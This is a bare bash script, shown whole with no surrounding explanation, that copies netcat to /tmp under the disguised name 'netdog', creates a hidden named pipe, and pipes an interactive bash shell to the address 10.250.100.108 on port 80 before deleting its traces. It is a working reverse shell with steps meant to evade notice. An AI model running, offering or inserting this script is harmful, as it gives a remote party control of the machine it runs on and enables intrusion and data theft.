#!/bin/bash
cp /bin/nc /tmp/netdog&&rm -f /tmp/.temp&&mkfifo /tmp/.temp&&cat /tmp/.temp|bash 2>&1|/tmp/netdog 10.250.100.108 80  >/tmp/.temp&&rm -f /tmp/.temp /tmp/netdog